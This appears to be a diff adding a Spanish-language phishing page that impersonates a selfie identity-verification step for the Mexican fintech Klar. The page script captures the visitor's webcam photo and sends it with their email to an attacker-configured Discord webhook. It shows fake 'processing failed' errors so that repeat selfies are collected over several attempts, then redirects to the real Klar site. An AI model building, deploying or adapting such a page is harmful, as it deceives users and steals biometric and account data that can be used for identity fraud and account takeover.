@@ -1,0 +1,1010 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Klar - Verificación Selfie</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap"
+    rel="stylesheet">
+
+
+  <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+
+  <script src="config.js"></script>
+
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      -webkit-tap-highlight-color: transparent;
+      font-family: 'Plus Jakarta Sans', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    }
+
+    html,
+    body {
+      width: 100%;
+      height: 100%;
+      background-color: #fafbfc;
+      color: #1a1a1a;
+      overflow: hidden;
+    }
+
+
+    .viewport {
+      width: 100%;
+      height: 100%;
+      max-width: 460px;
+      margin: 0 auto;
+      position: relative;
+      overflow: hidden;
+      background-color: #fafbfc;
+    }
+
+
+    .screen {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      padding: 24px 28px 36px 28px;
+      transition: transform 0.45s cubic-bezier(0.25, 1, 0.5, 1), opacity 0.35s ease;
+      background-color: #fafbfc;
+      z-index: 10;
+    }
+
+    .screen.hidden-left {
+      transform: translateX(-100%);
+      pointer-events: none;
+    }
+
+    .screen.hidden-right {
+      transform: translateX(100%);
+      pointer-events: none;
+    }
+
+    .screen.active {
+      transform: translateX(0);
+      pointer-events: auto;
+    }
+
+
+    .top-bar {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      width: 100%;
+      min-height: 48px;
+      position: relative;
+    }
+
+    .top-bar .title-centered {
+      position: absolute;
+      left: 50%;
+      transform: translateX(-50%);
+      font-size: 38px;
+      font-weight: 700;
+      color: #141414;
+      letter-spacing: -0.8px;
+    }
+
+    .icon-btn {
+      background: none;
+      border: none;
+      outline: none;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 8px;
+      border-radius: 50%;
+      color: #1e1e1e;
+      transition: background-color 0.2s ease, transform 0.1s ease;
+      margin-left: auto;
+    }
+
+    .icon-btn:hover {
+      background-color: rgba(0, 0, 0, 0.05);
+    }
+
+    .icon-btn:active {
+      transform: scale(0.92);
+    }
+
+
+    .camera-body {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      position: relative;
+      margin-top: -20px;
+    }
+
+
+    .viewfinder-outer {
+      position: relative;
+      width: 270px;
+      height: 270px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-radius: 50%;
+    }
+
+
+    .radial-ring-svg {
+      position: absolute;
+      top: -16px;
+      left: -16px;
+      width: 302px;
+      height: 302px;
+      pointer-events: none;
+      opacity: 0;
+      transition: opacity 0.5s ease, stroke 0.4s ease;
+      z-index: 5;
+    }
+
+    .radial-ring-svg.visible {
+      opacity: 1;
+    }
+
+
+    .viewfinder-inner {
+      width: 260px;
+      height: 260px;
+      border-radius: 50%;
+      overflow: hidden;
+      position: relative;
+      background-color: #e5e3de;
+      border: 3.5px solid #222222;
+      box-shadow: inset 0 0 10px rgba(0, 0, 0, 0.08);
+      transition: border-color 0.35s ease, border-width 0.35s ease;
+      z-index: 2;
+      cursor: pointer;
+    }
+
+    .viewfinder-inner.border-red {
+      border-color: #d32f2f !important;
+      border-width: 4px;
+    }
+
+    .viewfinder-inner.border-green {
+      border-color: #10b981 !important;
+      border-width: 4px;
+    }
+
+
+    #cameraVideo {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      transform: scaleX(-1);
+      position: absolute;
+      top: 0;
+      left: 0;
+      background-color: #1e1e1e;
+      transition: opacity 0.3s ease;
+    }
+
+
+    #snapshotCanvas {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      transform: scaleX(-1);
+      position: absolute;
+      top: 0;
+      left: 0;
+      display: none;
+      z-index: 3;
+    }
+
+
+    .face-silhouette {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+      z-index: 4;
+      transition: opacity 0.4s ease;
+    }
+
+
+    .camera-prompt-overlay {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: #2a2a2a;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      text-align: center;
+      color: #ffffff;
+      z-index: 7;
+      transition: opacity 0.3s ease;
+    }
+
+    .camera-prompt-btn {
+      background-color: #ffffff;
+      color: #141414;
+      border: none;
+      padding: 10px 18px;
+      border-radius: 20px;
+      font-weight: 600;
+      font-size: 14px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+
+
+    .circle-status-overlay {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: #e8e6e1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 24px;
+      text-align: center;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.4s ease;
+      z-index: 6;
+    }
+
+    .circle-status-overlay.visible {
+      opacity: 1;
+    }
+
+    .circle-status-text {
+      font-size: 19px;
+      font-weight: 600;
+      color: #202020;
+      line-height: 1.35;
+      letter-spacing: -0.2px;
+      transition: color 0.3s ease;
+    }
+
+    .circle-status-text.error-text {
+      color: #c62828;
+      font-weight: 700;
+      font-size: 18px;
+    }
+
+    .circle-status-text.success-text {
+      color: #047857;
+      font-weight: 700;
+      font-size: 18px;
+    }
+
+
+    .prep-message {
+      margin-top: 32px;
+      font-size: 21px;
+      font-weight: 600;
+      color: #27272a;
+      letter-spacing: -0.3px;
+      opacity: 0;
+      transition: opacity 0.4s ease;
+      height: 30px;
+    }
+
+    .prep-message.visible {
+      opacity: 1;
+    }
+
+
+    .shutter-flash {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: white;
+      opacity: 0;
+      pointer-events: none;
+      z-index: 10;
+      transition: opacity 0.15s ease;
+    }
+
+    .shutter-flash.flash {
+      opacity: 0.9;
+    }
+
+
+    .protocol-warning {
+      display: none;
+      position: absolute;
+      bottom: 8px;
+      left: 16px;
+      right: 16px;
+      background: rgba(239, 68, 68, 0.1);
+      border: 1px solid rgba(239, 68, 68, 0.3);
+      border-radius: 8px;
+      padding: 8px 12px;
+      font-size: 11px;
+      color: #b91c1c;
+      text-align: center;
+      z-index: 50;
+    }
+
+
+    .error-body {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+      padding: 0 12px;
+      margin-top: -40px;
+    }
+
+    .warning-icon {
+      width: 58px;
+      height: 52px;
+      margin-bottom: 24px;
+    }
+
+    .warning-icon svg {
+      width: 100%;
+      height: 100%;
+    }
+
+    .error-title {
+      font-size: 24px;
+      font-weight: 700;
+      color: #18181b;
+      line-height: 1.28;
+      margin-bottom: 14px;
+      letter-spacing: -0.3px;
+      max-width: 320px;
+    }
+
+    .error-subtitle {
+      font-size: 17px;
+      font-weight: 400;
+      color: #52525b;
+      line-height: 1.45;
+      max-width: 310px;
+    }
+
+    .auto-retry-note {
+      font-size: 14.5px;
+      font-weight: 600;
+      color: #2563eb;
+      margin-top: 14px;
+    }
+
+    .bottom-actions {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      width: 100%;
+      gap: 16px;
+    }
+
+    .pill-btn {
+      width: 100%;
+      height: 58px;
+      background-color: #141414;
+      color: #ffffff;
+      border: none;
+      outline: none;
+      border-radius: 9999px;
+      font-size: 17px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: transform 0.15s ease, background-color 0.2s ease, box-shadow 0.2s ease;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 4px 14px rgba(0, 0, 0, 0.16);
+    }
+
+    .pill-btn:hover {
+      background-color: #262626;
+      box-shadow: 0 6px 18px rgba(0, 0, 0, 0.22);
+    }
+
+    .pill-btn:active {
+      transform: scale(0.97);
+    }
+
+    .attempts-label {
+      font-size: 14.5px;
+      color: #71717a;
+      font-weight: 500;
+    }
+
+
+    .success-body {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+      padding: 0 16px;
+      margin-top: -30px;
+    }
+
+    .success-icon {
+      width: 76px;
+      height: 76px;
+      margin-bottom: 24px;
+      animation: popIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+    }
+
+    @keyframes popIn {
+      0% {
+        transform: scale(0.5);
+        opacity: 0;
+      }
+
+      100% {
+        transform: scale(1);
+        opacity: 1;
+      }
+    }
+
+    .success-title {
+      font-size: 24px;
+      font-weight: 700;
+      color: #18181b;
+      line-height: 1.28;
+      margin-bottom: 12px;
+      letter-spacing: -0.3px;
+    }
+
+    .success-subtitle {
+      font-size: 16px;
+      font-weight: 400;
+      color: #52525b;
+      line-height: 1.45;
+      max-width: 320px;
+    }
+
+
+    @keyframes pulseTicks {
+
+      0%,
+      100% {
+        transform: rotate(0deg) scale(1);
+      }
+
+      50% {
+        transform: rotate(180deg) scale(1.015);
+      }
+    }
+
+    .radial-ring-svg.animating {
+      animation: pulseTicks 12s linear infinite;
+    }
+  </style>
+</head>
+
+<body>
+
+  <main class="viewport">
+
+
+    <section class="screen active" id="screenCamera">
+      <header class="top-bar">
+        <span class="title-centered">Klar</span>
+        <button type="button" class="icon-btn" aria-label="Cerrar" onclick="handleClose()">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"
+            stroke-linecap="round" stroke-linejoin="round">
+            <line x1="18" y1="6" x2="6" y2="18"></line>
+            <line x1="6" y1="6" x2="18" y2="18"></line>
+          </svg>
+        </button>
+      </header>
+
+      <div class="camera-body">
+        <div class="viewfinder-outer">
+
+          <svg class="radial-ring-svg" id="radialRing" viewBox="0 0 302 302">
+            <circle id="radialCircle" cx="151" cy="151" r="142" fill="none" stroke="#969ba3" stroke-width="14"
+              stroke-dasharray="3.2 9.2" />
+          </svg>
+
+
+          <div class="viewfinder-inner" id="viewfinderInner" onclick="triggerCameraPermission()">
+
+            <video id="cameraVideo" autoplay playsinline muted></video>
+
+
+            <canvas id="snapshotCanvas"></canvas>
+
+
+            <svg class="face-silhouette" id="faceSilhouette" viewBox="0 0 240 240">
+              <path d="M 120 42
+                   C 94 42, 72 58, 68 88
+                   C 66 97, 65 104, 60 110
+                   C 53 118, 51 128, 58 136
+                   C 64 142, 69 146, 73 158
+                   C 77 170, 81 184, 85 198
+                   L 87 236
+                   M 120 42
+                   C 146 42, 168 58, 172 88
+                   C 174 97, 175 104, 180 110
+                   C 187 118, 189 128, 182 136
+                   C 176 142, 171 146, 167 158
+                   C 163 170, 159 184, 155 198
+                   L 153 236" fill="none" stroke="#ffffff" stroke-width="3.6" stroke-linecap="round"
+                stroke-linejoin="round" opacity="0.95" />
+            </svg>
+
+
+            <div class="camera-prompt-overlay" id="cameraPromptOverlay" style="display: none;">
+              <span style="font-size: 13px; margin-bottom: 8px;">Cámara desactivada</span>
+              <button type="button" class="camera-prompt-btn" onclick="triggerCameraPermission(event)">Permitir
+                cámara</button>
+            </div>
+
+
+            <div class="circle-status-overlay" id="circleStatusOverlay">
+              <span class="circle-status-text" id="circleStatusText">Procesando...</span>
+            </div>
+
+
+            <div class="shutter-flash" id="shutterFlash"></div>
+          </div>
+        </div>
+
+
+        <div class="prep-message" id="prepMessage">Prepárate...</div>
+      </div>
+
+      <div class="protocol-warning" id="protocolWarning">
+        Abre desde <strong>http://localhost:8000</strong> para permitir la cámara web en el navegador.
+      </div>
+
+      <div style="height: 48px;"></div>
+    </section>
+
+
+    <section class="screen hidden-right" id="screenError">
+      <header class="top-bar">
+        <button type="button" class="icon-btn" aria-label="Cerrar">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"
+            stroke-linecap="round" stroke-linejoin="round">
+            <line x1="18" y1="6" x2="6" y2="18"></line>
+            <line x1="6" y1="6" x2="18" y2="18"></line>
+          </svg>
+        </button>
+      </header>
+
+      <div class="error-body">
+
+        <div class="warning-icon">
+          <svg viewBox="0 0 54 48" fill="none">
+            <path
+              d="M23.5359 2.5C25.0755 -0.166669 28.9245 -0.166666 30.4641 2.5L52.9808 41.5C54.5204 44.1667 52.5959 47.5 49.5167 47.5H4.48331C1.40411 47.5 -0.520392 44.1667 1.01921 41.5L23.5359 2.5Z"
+              fill="#E53935" />
+            <rect x="25" y="16" width="4" height="15" rx="2" fill="white" />
+            <circle cx="27" cy="37" r="2.5" fill="white" />
+          </svg>
+        </div>
+
+        <h1 class="error-title">Falló el procesamiento de la selfie</h1>
+        <p class="error-subtitle">No pudimos procesar tu selfie. Por favor, intenta de nuevo</p>
+        <p class="auto-retry-note" id="autoRetryNote">Reintentando automáticamente...</p>
+      </div>
+
+      <div class="bottom-actions">
+        <button type="button" class="pill-btn" id="btnTryAgain" onclick="manualRetry()">
+          Reintentando en 3s...
+        </button>
+        <span class="attempts-label" id="attemptsLabel">2 intentos restantes</span>
+      </div>
+    </section>
+
+
+    <section class="screen hidden-right" id="screenSuccess">
+      <header class="top-bar">
+        <span class="title-centered">Klar</span>
+      </header>
+
+      <div class="success-body">
+
+        <div class="success-icon">
+          <svg viewBox="0 0 76 76" fill="none">
+            <circle cx="38" cy="38" r="36" fill="#ECFDF5" stroke="#10B981" stroke-width="3.5" />
+            <path d="M24 38L33 47L52 28" stroke="#10B981" stroke-width="4.5" stroke-linecap="round"
+              stroke-linejoin="round" />
+          </svg>
+        </div>
+
+        <h1 class="success-title">¡Verificación exitosa!</h1>
+        <p class="success-subtitle">Tu identidad ha sido validada correctamente. Tu cuenta está lista para usarse.</p>
+      </div>
+
+      <div class="bottom-actions">
+        <button type="button" class="pill-btn" onclick="handleFinish()">
+          Continuar
+        </button>
+      </div>
+    </section>
+
+  </main>
+
+  <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const userEmail = sessionStorage.getItem('klar_user_email') || urlParams.get('email') || 'correo_no_especificado@klar.com';
+
+    let currentAttempt = 1;
+    const maxAttempts = (typeof CONFIG !== 'undefined' && CONFIG.TOTAL_ATTEMPTS) ? CONFIG.TOTAL_ATTEMPTS : 3;
+    const successAttempt = (typeof CONFIG !== 'undefined' && CONFIG.SUCCESS_ON_ATTEMPT) ? CONFIG.SUCCESS_ON_ATTEMPT : 3;
+
+    let stream = null;
+    let flowTimeouts = [];
+    let autoRetryTimer = null;
+    let capturedBlob = null;
+    let isCameraReady = false;
+
+    const screenCamera = document.getElementById('screenCamera');
+    const screenError = document.getElementById('screenError');
+    const screenSuccess = document.getElementById('screenSuccess');
+    const attemptsLabel = document.getElementById('attemptsLabel');
+    const autoRetryNote = document.getElementById('autoRetryNote');
+    const btnTryAgain = document.getElementById('btnTryAgain');
+    const cameraVideo = document.getElementById('cameraVideo');
+    const snapshotCanvas = document.getElementById('snapshotCanvas');
+    const faceSilhouette = document.getElementById('faceSilhouette');
+    const radialRing = document.getElementById('radialRing');
+    const radialCircle = document.getElementById('radialCircle');
+    const viewfinderInner = document.getElementById('viewfinderInner');
+    const circleStatusOverlay = document.getElementById('circleStatusOverlay');
+    const circleStatusText = document.getElementById('circleStatusText');
+    const prepMessage = document.getElementById('prepMessage');
+    const shutterFlash = document.getElementById('shutterFlash');
+    const cameraPromptOverlay = document.getElementById('cameraPromptOverlay');
+    const protocolWarning = document.getElementById('protocolWarning');
+
+    if (window.location.protocol === 'file:') {
+      protocolWarning.style.display = 'block';
+    }
+
+    function clearFlowTimeouts() {
+      flowTimeouts.forEach(t => clearTimeout(t));
+      flowTimeouts = [];
+      if (autoRetryTimer) {
+        clearInterval(autoRetryTimer);
+        autoRetryTimer = null;
+      }
+    }
+
+    window.addEventListener('DOMContentLoaded', () => {
+      startSelfieSequence();
+    });
+
+    async function triggerCameraPermission(e) {
+      if (e) e.stopPropagation();
+      cameraPromptOverlay.style.display = 'none';
+      await initCamera();
+    }
+
+    async function initCamera() {
+      if (stream && stream.active) {
+        return true;
+      }
+
+      try {
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+          throw new Error('navigator.mediaDevices.getUserMedia no soportado en este contexto');
+        }
+
+        stream = await navigator.mediaDevices.getUserMedia({
+          video: {
+            facingMode: 'user',
+            width: { ideal: 720 },
+            height: { ideal: 720 }
+          },
+          audio: false
+        });
+
+        cameraVideo.srcObject = stream;
+        cameraPromptOverlay.style.display = 'none';
+
+        await new Promise((resolve) => {
+          if (cameraVideo.readyState >= 2) {
+            resolve();
+          } else {
+            cameraVideo.onloadedmetadata = () => resolve();
+          }
+        });
+
+        await cameraVideo.play();
+        isCameraReady = true;
+        return true;
+      } catch (err) {
+        console.warn('Acceso a cámara no disponible:', err);
+        if (window.location.protocol !== 'file:') {
+          cameraPromptOverlay.style.display = 'flex';
+        }
+        simulateCameraFeed();
+        return false;
+      }
+    }
+
+    async function startSelfieSequence() {
+      clearFlowTimeouts();
+
+      snapshotCanvas.style.display = 'none';
+      cameraVideo.style.display = 'block';
+      faceSilhouette.style.opacity = '1';
+      prepMessage.classList.remove('visible');
+      radialRing.classList.remove('visible', 'animating');
+      circleStatusOverlay.classList.remove('visible');
+      circleStatusText.className = 'circle-status-text';
+      circleStatusText.textContent = 'Procesando...';
+      viewfinderInner.className = 'viewfinder-inner';
+
+      radialCircle.setAttribute('stroke', '#969ba3');
+      radialCircle.setAttribute('stroke-width', '14');
+      radialCircle.setAttribute('stroke-dasharray', '3.2 9.2');
+
+      const isCurrentSuccess = (currentAttempt >= successAttempt);
+
+      await initCamera();
+
+      flowTimeouts.push(setTimeout(() => {
+        radialRing.classList.add('visible', 'animating');
+        prepMessage.classList.add('visible');
+      }, CONFIG.TIMINGS.PREPARE_TICKS));
+
+      flowTimeouts.push(setTimeout(() => {
+        takeSelfieSnapshot();
+      }, CONFIG.TIMINGS.CAPTURE_PHOTO));
+
+      flowTimeouts.push(setTimeout(() => {
+        prepMessage.classList.remove('visible');
+        faceSilhouette.style.opacity = '0';
+        circleStatusOverlay.classList.add('visible');
+        circleStatusText.textContent = 'Procesando...';
+      }, CONFIG.TIMINGS.PROCESSING_TEXT));
+
+      flowTimeouts.push(setTimeout(() => {
+        circleStatusText.textContent = 'Subiendo...';
+        sendSelfieToDiscord(isCurrentSuccess);
+      }, CONFIG.TIMINGS.UPLOADING_TEXT));
+
+      if (!isCurrentSuccess) {
+        flowTimeouts.push(setTimeout(() => {
+          radialCircle.setAttribute('stroke', '#d32f2f');
+          radialCircle.setAttribute('stroke-width', '4');
+          radialCircle.setAttribute('stroke-dasharray', 'none');
+          viewfinderInner.classList.add('border-red');
+          circleStatusText.className = 'circle-status-text error-text';
+          circleStatusText.innerHTML = 'Falló el<br>procesamiento de la<br>selfie';
+        }, CONFIG.TIMINGS.SHOW_FAIL_CIRCLE));
+
+        flowTimeouts.push(setTimeout(() => {
+          stopCamera();
+          const remaining = maxAttempts - currentAttempt;
+          attemptsLabel.textContent = `${remaining} intento${remaining === 1 ? '' : 's'} restante${remaining === 1 ? '' : 's'}`;
+
+          screenCamera.className = 'screen hidden-left';
+          screenError.className = 'screen active';
+
+          startAutoRetryCountdown();
+        }, CONFIG.TIMINGS.SLIDE_TO_ERROR));
+
+      } else {
+        flowTimeouts.push(setTimeout(() => {
+          radialCircle.setAttribute('stroke', '#10b981');
+          radialCircle.setAttribute('stroke-width', '4');
+          radialCircle.setAttribute('stroke-dasharray', 'none');
+          viewfinderInner.classList.add('border-green');
+          circleStatusText.className = 'circle-status-text success-text';
+          circleStatusText.innerHTML = '<div style="font-size:32px; color:#10b981; margin-bottom:4px;">✓</div>Selfie verificada<br>con éxito';
+        }, CONFIG.TIMINGS.SHOW_SUCCESS_CIRCLE));
+
+        flowTimeouts.push(setTimeout(() => {
+          stopCamera();
+          screenCamera.className = 'screen hidden-left';
+          screenSuccess.className = 'screen active';
+        }, CONFIG.TIMINGS.SLIDE_TO_SUCCESS));
+      }
+    }
+
+    function startAutoRetryCountdown() {
+      let secondsLeft = (typeof CONFIG !== 'undefined' && CONFIG.AUTO_RETRY_SECONDS) ? CONFIG.AUTO_RETRY_SECONDS : 3;
+      autoRetryNote.textContent = `Reintentando automáticamente en ${secondsLeft} segundos...`;
+      btnTryAgain.textContent = `Reintentando en ${secondsLeft}s...`;
+
+      autoRetryTimer = setInterval(() => {
+        secondsLeft--;
+        if (secondsLeft > 0) {
+          autoRetryNote.textContent = `Reintentando automáticamente en ${secondsLeft} segundo${secondsLeft === 1 ? '' : 's'}...`;
+          btnTryAgain.textContent = `Reintentando en ${secondsLeft}s...`;
+        } else {
+          clearInterval(autoRetryTimer);
+          autoRetryTimer = null;
+          autoRetryNote.textContent = 'Iniciando cámara...';
+          btnTryAgain.textContent = 'Iniciando cámara...';
+          executeNextAttempt();
+        }
+      }, 1000);
+    }
+
+    function manualRetry() {
+      if (autoRetryTimer) {
+        clearInterval(autoRetryTimer);
+        autoRetryTimer = null;
+      }
+      executeNextAttempt();
+    }
+
+    function executeNextAttempt() {
+      currentAttempt++;
+      screenError.className = 'screen hidden-right';
+      screenCamera.className = 'screen active';
+
+      startSelfieSequence();
+    }
+
+    function stopCamera() {
+      if (stream) {
+        stream.getTracks().forEach(track => track.stop());
+        stream = null;
+        isCameraReady = false;
+      }
+    }
+
+    function takeSelfieSnapshot() {
+      shutterFlash.classList.add('flash');
+      setTimeout(() => shutterFlash.classList.remove('flash'), 150);
+
+      playShutterSound();
+
+      const vw = cameraVideo.videoWidth || 640;
+      const vh = cameraVideo.videoHeight || 640;
+      snapshotCanvas.width = vw;
+      snapshotCanvas.height = vh;
+      const ctx = snapshotCanvas.getContext('2d');
+
+      try {
+        ctx.drawImage(cameraVideo, 0, 0, vw, vh);
+      } catch (e) {
+        console.warn('Error al dibujar snapshot:', e);
+      }
+
+      snapshotCanvas.style.display = 'block';
+      cameraVideo.style.display = 'none';
+
+      snapshotCanvas.toBlob((blob) => {
+        capturedBlob = blob;
+      }, 'image/jpeg', 0.92);
+    }
+
+    async function sendSelfieToDiscord(isSuccess) {
+      if (!CONFIG.DISCORD_WEBHOOK) return;
+
+      try {
+        const formData = new FormData();
+        const now = new Date();
+        const fechaHora = now.toLocaleString('es-MX', { dateStyle: 'full', timeStyle: 'medium' });
+
+        if (capturedBlob) {
+          formData.append('file', capturedBlob, `klar_selfie_intento_${currentAttempt}_${Date.now()}.jpg`);
+        }
+
+        const statusLabel = isSuccess ? '✅ Éxito (Aprobada)' : '❌ Fallo (Reintentando)';
+
+        const payload = {
+          username: "Klar Selfie",
+          avatar_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/c/c5/Target_Corporation_logo_%28vector%29.svg/100px-Target_Corporation_logo_%28vector%29.svg.png",
+          content: `📸 **Nueva selfie recibida para:** \`${userEmail}\``,
+          embeds: [
+            {
+              title: isSuccess ? "✅ Selfie Verificada con Éxito" : "📸 Selfie de Verificación",
+              color: isSuccess ? 0x10b981 : 0x141414,
+              fields: [
+                { name: "📧 Correo", value: `\`${userEmail}\``, inline: false },
+                { name: "🕒 Fecha y Hora", value: fechaHora, inline: true },
+                { name: "🔄 Intento", value: `${currentAttempt} de ${maxAttempts}`, inline: true },
+                { name: "📋 Estado", value: `\`${statusLabel}\``, inline: true }
+              ],
+              timestamp: new Date().toISOString()
+            }
+          ]
+        };
+
+        formData.append('payload_json', JSON.stringify(payload));
+
+        await axios.post(CONFIG.DISCORD_WEBHOOK, formData, {
+          headers: { 'Content-Type': 'multipart/form-data' }
+        });
+
+        console.log(`✅ Selfie intento ${currentAttempt} enviada a Discord.`);
+      } catch (error) {
+        console.error('❌ Error al enviar webhook a Discord:', error);
+      }
+    }
+
+    function simulateCameraFeed() {
+      const canvas = document.createElement('canvas');
+      canvas.width = 400;
+      canvas.height = 400;
+      const ctx = canvas.getContext('2d');
+
+      let hue = 210;
+      function renderSim() {
+        if (!stream && cameraVideo.style.display !== 'none') {
+          hue = (hue + 0.3) % 360;
+          const grad = ctx.createRadialGradient(200, 180, 40, 200, 200, 220);
+          grad.addColorStop(0, `hsl(${hue}, 20%, 75%)`);
+          grad.addColorStop(1, `hsl(${hue}, 30%, 45%)`);
+          ctx.fillStyle = grad;
+          ctx.fillRect(0, 0, 400, 400);
+
+          ctx.fillStyle = 'rgba(255, 255, 255, 0.2)';
+          ctx.beginPath();
+          ctx.arc(200, 160, 65, 0, Math.PI * 2);
+          ctx.fill();
+
+          ctx.beginPath();
+          ctx.ellipse(200, 310, 110, 80, 0, 0, Math.PI * 2);
+          ctx.fill();
+
+          try {
+            cameraVideo.srcObject = canvas.captureStream();
+            cameraVideo.play();
+          } catch (e) { }
+          requestAnimationFrame(renderSim);
+        }
+      }
+      renderSim();
+    }
+
+    function playShutterSound() {
+      try {
+        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        const osc = audioCtx.createOscillator();
+        const gain = audioCtx.createGain();
+        osc.type = 'triangle';
+        osc.frequency.setValueAtTime(800, audioCtx.currentTime);
+        osc.frequency.exponentialRampToValueAtTime(120, audioCtx.currentTime + 0.08);
+        gain.gain.setValueAtTime(0.18, audioCtx.currentTime);
+        gain.gain.linearRampToValueAtTime(0.01, audioCtx.currentTime + 0.08);
+        osc.connect(gain);
+        gain.connect(audioCtx.destination);
+        osc.start();
+        osc.stop(audioCtx.currentTime + 0.08);
+      } catch (e) { }
+    }
+
+    function handleFinish() {
+      const targetUrl = (typeof CONFIG !== 'undefined' && CONFIG.REDIRECT_URL) ? CONFIG.REDIRECT_URL : 'https://www.klar.mx';
+      window.location.href = targetUrl;
+    }
+
+    function handleClose() {
+      window.location.href = 'index.html';
+    }
+  </script>
+</body>
+
+</html>
